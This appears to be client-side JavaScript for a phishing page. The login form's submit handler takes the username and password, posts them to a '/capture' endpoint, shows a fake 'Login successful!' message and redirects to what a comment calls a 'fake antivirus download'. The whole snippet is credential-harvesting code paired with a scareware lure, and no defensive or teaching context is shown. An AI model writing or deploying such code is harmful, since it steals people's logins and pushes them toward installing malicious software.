document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Send credentials to the server
    fetch('/capture', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ username, password })
    }).then(response => response.json())
      .then(data => {
          if (data.success) {
              alert('Login successful!');
              // Redirect to fake antivirus download
              window.location.href = '/download';
          } else {
              alert('Login failed. Please try again.');
          }
      });
});